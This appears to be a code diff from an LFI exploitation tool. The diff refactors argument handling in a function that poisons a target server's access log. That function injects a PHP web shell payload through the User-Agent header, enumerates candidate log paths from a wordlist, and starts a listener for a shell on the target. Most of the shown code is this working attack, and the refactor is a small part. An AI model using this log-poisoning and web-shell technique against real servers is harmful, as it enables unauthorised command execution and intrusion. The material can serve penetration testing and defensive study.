@@ -2,7 +2,7 @@
 import os
 import threading
 
-from src.utils.arguments import args
+from src.utils.arguments import init_args
 from src.httpreqs import request
 from src.configs import config
 from src.utils.args_check import scriptDirectory
@@ -14,10 +14,11 @@ from src.servers.LFIshell import start_listener
 def exploit_log_poison(
     ip, port, url, payloadStageOne, payloadStageTwo, testPayload, testString, post
 ):
-    if args.f:
+    args  = init_args()
+    if args['f']:
         return
 
-    maliciousHeaders = args.httpheaders.copy()
+    maliciousHeaders = args['httpheaders'].copy()
     maliciousHeaders["User-Agent"] = "<?php system($_GET['c']); ?>"
     lastPrintedStringLen = 0
 
@@ -38,8 +39,7 @@ def exploit_log_poison(
     with open(scriptDirectory + os.sep + "src/wordlists/http_access_log.txt", "r", encoding="latin1") as f:
         print(
             colors.green("[i]")
-            + " Enumerating file system to discover access log location...",
-            flush = True
+            + " Enumerating file system to discover access log location...", flush = True
         )
         lines = f.readlines()
         for line in lines:
@@ -52,7 +52,7 @@ def exploit_log_poison(
             if post:
                 res, _ = request.REQUEST(
                     url,
-                    args.httpheaders,
+                    args['httpheaders'],
                     post.replace(config.tempArg, line),
                     config.proxies,
                     "",
@@ -62,7 +62,7 @@ def exploit_log_poison(
             else:
                 res, _ = request.REQUEST(
                     url.replace(config.tempArg, line),
-                    args.httpheaders,
+                    args['httpheaders'],
                     post,
                     config.proxies,
                     "",
@@ -70,7 +70,7 @@ def exploit_log_poison(
                     exploit=True,
                 )
 
-            if args.httpheaders["User-Agent"] in res.text:
+            if args['httpheaders']["User-Agent"] in res.text:
                 lastPrintedStringLen = printFancyString("", lastPrintedStringLen)
                 print(
                     "\n"
@@ -141,7 +141,7 @@ def exploit_log_poison(
 
                     res, _ = request.REQUEST(
                     exploitUrl,
-                    args.httpheaders,
+                    args['httpheaders'],
                     post,
                     config.proxies,
                     "",
@@ -160,7 +160,7 @@ def exploit_log_poison(
                         )
                         request.REQUEST(
                             url,
-                            args.httpheaders,
+                            args['httpheaders'],
                             exploitPost,
                             config.proxies,
                             "",
@@ -177,7 +177,7 @@ def exploit_log_poison(
                             request.REQUEST(
                                 url,
                                 exploitPost,
-                                args.httpheaders,
+                                args['httpheaders'],
                                 config.proxies,
                                 "",
                                 "",
@@ -197,7 +197,7 @@ def exploit_log_poison(
                         )
                         request.REQUEST(
                             exploitUrl,
-                            args.httpheaders,
+                            args['httpheaders'],
                             post,
                             config.proxies,
                             "",
@@ -218,7 +218,7 @@ def exploit_log_poison(
                             )
                             request.REQUEST(
                                 exploitUrl,
-                                args.httpheaders,
+                                args['httpheaders'],
                                 post,
                                 config.proxies,
                                 "",
@@ -231,7 +231,8 @@ def exploit_log_poison(
                         thread.join(timeout=10)
                         break
         else:
-            if args.verbose:
+            # lastPrintedStringLen = printFancyString("", lastPrintedStringLen)
+            if args['verbose']:
                 printFancyString(
                     colors.red("[-]")
                     + " Couldn't locate target server's access log to poison/log is not readable.\n",
